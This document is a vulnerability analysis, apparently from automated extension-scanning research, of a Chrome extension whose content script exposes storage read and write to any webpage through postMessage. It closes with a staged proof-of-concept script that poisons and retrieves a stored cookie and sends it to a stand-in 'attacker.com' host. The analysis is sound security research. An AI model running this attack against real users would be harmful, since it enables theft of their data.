# CoCo Analysis: fipcjgnajmkjnnofhejohblljnifhldi

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 4

---

## Sink 1: cs_window_eventListener_message → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/fipcjgnajmkjnnofhejohblljnifhldi/opgen_generated_files/cs_0.js
Line 643: mwapi.prototype.onMultiwebMsg = function (e) { e }

Line 645: window.mwapi.execute(e.data);

Line 736: if (e.data.type == "setLanguage") { e.data }

Line 737: chrome.storage.local.set({ "selectedLanguage": e.data.selectedLanguage })

**Code:**

```javascript
// Content script - cs_0.js

// Message listener setup
mwapi.prototype.onMultiwebMsg = function (e) {
  try {
    window.mwapi.execute(e.data); // ← Execute attacker-controlled data
  } catch (e) {
    console.log(e)
  }
}

// Execute function handles different message types
mwapi.prototype.execute = async function (e) {
  try {
    if (e.type == "req_cookie") {

      // Storage write - Language
      if (e.data.type == "setLanguage") {
        chrome.storage.local.set({
          "selectedLanguage": e.data.selectedLanguage // ← attacker-controlled
        }, function () {});
        window.postMessage({
          type: '_mw_language_',
          msg: e.data.selectedLanguage
        }, '*');
      }

      // Storage write - Cookie
      if (e.data.type == "set") {
        chrome.storage.local.set({
          "mwcookie": e.data.cookie // ← attacker-controlled
        }, function () {});
      }
    }
  } catch (e) {
    console.log(e)
  }
}
```

**Classification:** TRUE POSITIVE (Part of complete exploitation chain)

---

## Sink 2: storage_local_get_source → window_postMessage_sink (Language)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/fipcjgnajmkjnnofhejohblljnifhldi/opgen_generated_files/cs_0.js
Line 418: var storage_local_get_source = {'key': 'value'};

Line 758: if (items && items['selectedLanguage']) { items['selectedLanguage'] }

**Code:**

```javascript
// Storage read and exfiltration - Language
if (e.data.type == "getLanguage") {
  let userLang = navigator.language || navigator.userLanguage;
  const supportedLanguages = {
    "pt-BR": "pt_BR", "pt": "pt_BR",
    "es-ES": "es", "es": "es",
    "en-US": "en", "en-GB": "en", "en": "en"
  };

  let selectedLanguage = supportedLanguages[userLang] || "en";
  chrome.storage.local.get(["selectedLanguage"], function (items) {
    let lang = {selectedLanguage: selectedLanguage};
    if (items && items['selectedLanguage']) {
      lang = items['selectedLanguage']; // ← Retrieve stored value
    }
    window.postMessage({
      type: '_mw_language_',
      msg: lang // ← Send back to attacker
    }, '*');
  });
}
```

**Classification:** TRUE POSITIVE (Part of complete exploitation chain)

---

## Sink 3: storage_local_get_source → window_postMessage_sink (Cookie)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/fipcjgnajmkjnnofhejohblljnifhldi/opgen_generated_files/cs_0.js
Line 418: var storage_local_get_source = {'key': 'value'};

Line 769: if (items && items['mwcookie']) { items['mwcookie'] }

**Code:**

```javascript
// Storage read and exfiltration - Cookie
if (e.data.type == "get") {
  chrome.storage.local.get(["mwcookie"], function (items) {
    let ck = null;
    if (items && items['mwcookie']) {
      ck = items['mwcookie']; // ← Retrieve stored value
    }
    window.postMessage({
      type: '_mw_cookie_',
      msg: ck // ← Send back to attacker
    }, '*');
  });
}
```

**Classification:** TRUE POSITIVE (Part of complete exploitation chain)

---

## Sink 4: cs_window_eventListener_message → chrome_storage_local_set_sink

**CoCo Trace:**
Line 779: chrome.storage.local.set({ "mwcookie": e.data.cookie })

**Classification:** TRUE POSITIVE (Same as Sink 1)

---

## Overall Vulnerability Assessment

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage from malicious webpage

**Attack:**

```javascript
// Stage 1: Poison storage with attacker-controlled data
window.postMessage({
  type: "req_cookie",
  data: {
    type: "set",
    cookie: "attacker_controlled_token_12345"
  }
}, "*");

// Stage 2: Retrieve the poisoned data
window.postMessage({
  type: "req_cookie",
  data: {
    type: "get"
  }
}, "*");

// Stage 3: Listen for the leaked data
window.addEventListener("message", function(event) {
  if (event.data.type === "_mw_cookie_") {
    console.log("Exfiltrated cookie:", event.data.msg);
    // Send to attacker server:
    fetch("https://attacker.com/collect", {
      method: "POST",
      body: JSON.stringify({stolen: event.data.msg})
    });
  }
});

// Alternative: Language storage poisoning and retrieval
window.postMessage({
  type: "req_cookie",
  data: {
    type: "setLanguage",
    selectedLanguage: "attacker_payload"
  }
}, "*");

window.postMessage({
  type: "req_cookie",
  data: {
    type: "getLanguage"
  }
}, "*");

window.addEventListener("message", function(event) {
  if (event.data.type === "_mw_language_") {
    console.log("Exfiltrated language data:", event.data.msg);
  }
});
```

**Impact:** Complete storage exploitation chain. Attacker can:
1. Write arbitrary data to chrome.storage.local (storage poisoning)
2. Retrieve stored data including cookies and language settings (information disclosure)
3. The extension uses window.postMessage with wildcard origin ('*'), allowing any webpage to trigger these operations
4. Enables both data injection and exfiltration attacks

This is a textbook example of a complete storage exploitation chain per the methodology: attacker-controlled data → storage.set → storage.get → attacker-accessible output (postMessage back to webpage).
